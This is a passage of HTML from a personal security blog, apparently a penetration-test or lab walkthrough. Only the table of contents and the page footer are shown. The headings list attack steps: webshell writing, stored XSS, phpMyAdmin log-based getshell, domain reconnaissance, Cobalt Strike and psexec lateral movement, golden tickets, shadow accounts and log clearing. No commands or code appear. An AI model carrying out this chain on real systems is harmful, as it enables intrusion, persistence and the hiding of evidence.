class="nav-text">后台写入shell文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8BXSS"><span class="nav-number">3.3.</span> <span class="nav-text">前台存储型XSS</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phpMyAdmin%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%97%A5%E5%BF%97getshell"><span class="nav-number">3.4.</span> <span class="nav-text">phpMyAdmin弱口令+数据库日志getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%99%BB%E5%BD%95"><span class="nav-number">3.4.1.</span> <span class="nav-text">弱口令登录</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6getshell-%E5%A4%B1%E8%B4%A5"><span class="nav-number">3.4.2.</span> <span class="nav-text">写入文件getshell(失败)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%85%A8%E5%B1%80%E6%97%A5%E5%BF%97getshell"><span class="nav-number">3.4.3.</span> <span class="nav-text">全局日志getshell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%85%A2%E6%9F%A5%E8%AF%A2%E6%97%A5%E5%BF%97getshell"><span class="nav-number">3.4.4.</span> <span class="nav-text">慢查询日志getshell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%94%99%E8%AF%AF%E6%97%A5%E5%BF%97getshell-%E5%A4%B1%E8%B4%A5"><span class="nav-number">3.4.5.</span> <span class="nav-text">错误日志getshell(失败)</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%90%9C%E9%9B%86"><span class="nav-number">4.</span> <span class="nav-text">内网搜集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C"><span class="nav-number">4.1.</span> <span class="nav-text">准备工作</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">4.2.</span> <span class="nav-text">域信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3389%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95"><span class="nav-number">4.3.</span> <span class="nav-text">3389远程登录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%91%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F"><span class="nav-number">4.4.</span> <span class="nav-text">内网漏洞扫描</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F"><span class="nav-number">5.</span> <span class="nav-text">横向渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#CS%E6%B4%BE%E7%94%9FSMB-beacon"><span class="nav-number">5.1.</span> <span class="nav-text">CS派生SMB beacon</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#psexec%E4%BD%BF%E7%94%A8%E5%87%AD%E8%AF%81%E7%99%BB%E5%BD%95%E5%85%B6%E4%BB%96%E4%B8%BB%E6%9C%BA"><span class="nav-number">5.2.</span> <span class="nav-text">psexec使用凭证登录其他主机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#MSF%E8%81%94%E5%8A%A8CS"><span class="nav-number">5.3.</span> <span class="nav-text">MSF联动CS</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">6.</span> <span class="nav-text">权限维持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="nav-number">6.1.</span> <span class="nav-text">黄金票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BD%B1%E5%AD%90%E8%B4%A6%E6%88%B7"><span class="nav-number">6.2.</span> <span class="nav-text">影子账户</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E6%97%A5%E5%BF%97"><span class="nav-number">7.</span> <span class="nav-text">清除日志</span></a></li></ol></div></div></div></div></div></div></div><div class="page-main-content-bottom"><footer class="footer"><div class="info-container"><div class="copyright-info info-item">&copy; <span>2022.04.28</span> - 2023 &nbsp;<i class="fas fa-heart icon-animate"></i> &nbsp;<a href="/">Charmersix</a></div><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="website-count info-item">Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp; Totalview&nbsp;<span id="busuanzi_value_site_pv"></span></div><div class="theme-info info-item">Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a></div></div></footer></div></div><div class="post-tools"><div class="post-tools-container"><ul class="tools-list"><li class="tools-item flex-center toggle-show-toc"><i class="fas fa-list"></i></li><li class="tools-item flex-center go-to-comments"><i class="fas fa-comment"></i> <span class="post-comments-count"></span></li></ul></div></div><div class="right-bottom-side-tools"><div class="side-tools-container"><ul class="side-tools-list"><li class="tools-item tool-font-adjust-plus flex-center"><i class="fas fa-search-plus"></i></li><li class="tools-item tool-font-adjust-minus flex-center"><i class="fas fa-search-minus"></i></li><li class="tools-item tool-dark-light-toggle flex-center"><i class="fas fa-moon"></i></li><li class="tools-item tool-scroll-to-bottom flex-center"><i class="fas fa-arrow-down"></i></li></ul><ul class="exposed-tools-list"><li class="tools-item tool-toggle-show flex-center"><i class="fas fa-cog fa-spin"></i></li><li class="tools-item tool-scroll-to-top flex-center"><i class="arrow-up fas fa-arrow-up"></i> <span class="percent"></span></li></ul></div></div><div class="zoom-in-image-mask"><img class="zoom-in-image"></div><div class="search-pop-overlay"><div class="popup search-popup"><div class="search-header"><span class="search-input-field-pre"><i class="fas fa-keyboard"></i></span><div class="search-input-container"><input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input"></div><span class="close-popup-btn"><i class="fas fa-times"></i></span></div><div id="search-result"><div id="no-result"><i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i></div></div></div></div></main><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/local-search.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/code-block.js"></script><div class="post-scripts"><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script><script src="//unpkg.com/hexo-theme-keep@3.6.1/source/js/toc.js"></script></div></body></html>